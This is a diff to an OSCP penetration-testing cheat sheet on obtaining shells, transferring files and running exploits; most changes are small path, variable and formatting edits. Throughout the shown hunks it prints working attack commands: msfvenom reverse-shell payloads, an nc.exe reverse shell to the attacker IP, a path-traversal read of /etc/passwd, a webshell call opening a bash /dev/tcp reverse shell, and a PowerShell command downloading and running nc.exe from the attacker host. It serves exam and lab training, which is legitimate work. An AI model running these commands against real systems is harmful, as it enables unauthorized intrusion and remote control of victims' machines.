@@ -4,12 +4,13 @@ date: 2026-06-20
 weight: 60
 draft: false
 summary: "The basic workflow from getting a shell and stabilizing it to transferring files and running exploits."
+description: "The basic workflow from getting a shell and stabilizing it to transferring files and running exploits."
 ---
 
 Reference for getting shells, transferring files, and running exploit workflows.
 
 - Source: https://heretek.dev/oscp-cheatsheet/shells-and-transfers/ (Jean Romero) — reconstructed
-- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP (`ATTACKER` and `YOUR_IP` in the body are also the attacker IP)
+- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP (`ATTACKER` / `YOUR_IP` = attacker IP, `$ip` = target IP in the body)
 
 ## Searchsploit and the exploit workflow
 
@@ -213,7 +214,7 @@ Hard-learned lessons:
 - WAR: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war`
 - PHP: `msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php`
 - HTA: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o shell.hta`
-- nc.exe alternative: `C:\temp\nc.exe ATTACKER 4444 -e cmd.exe`
+- nc.exe alternative: `C:\Windows\Temp\nc.exe ATTACKER 4444 -e cmd.exe`
 
 ### Groovy reverse shell (Jenkins Script Console)
 
@@ -328,7 +329,7 @@ Always add `-user` and `-password`. Modern Windows (Win10/11, Server 2019+) bloc
 
 If `net use` also fails, reverse the transfer direction: run `python3 -m http.server 8888` on the Windows target and download from Kali with `wget`.
 
-```bash
+```text
 # Attacker:
 impacket-smbserver smb $(pwd) -smb2support -user test -password test
 
@@ -442,7 +443,7 @@ Trigger examples:
 ```text
 curl -s http://$TARGET/request.php
 curl -s "http://$TARGET/index.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
-curl -s "http://$TARGET/index.php?file=….//….//….//etc/passwd"
+curl -s "http://$TARGET/index.php?file=....//....//....//etc/passwd"
 curl -sG "http://$TARGET/index.php" \
   --data-urlencode "file=simple_shell.php" \
   --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"
@@ -471,7 +472,7 @@ curl 'http://TARGET/shell.aspx?c=whoami'
 Then download nc.exe and upgrade to a real shell:
 
 ```text
-curl 'http://TARGET/shell.aspx?c=powershell+-c+iwr+http://KALI/nc.exe+-o+C:\Windows\Temp\nc.exe'
+curl 'http://TARGET/shell.aspx?c=powershell+-c+iwr+http://<KALI_IP>/nc.exe+-o+C:\Windows\Temp\nc.exe'
 curl 'http://TARGET/shell.aspx?c=C:\Windows\Temp\nc.exe+KALI+4444+-e+cmd.exe'
 ```
 
@@ -491,6 +492,8 @@ export TERM=xterm SHELL=bash
 ```
 
 Windows: if you have credentials, use evil-winrm or RDP. Live with raw nc shell limitations or upgrade to powershell.
+
+### Recovery
 
 - Symptom: Apache is listening on 80 but requests hang. ps shows several httpd workers in T state.
 - Cause: blocking PHP reverse shells piled up, each holding one worker.
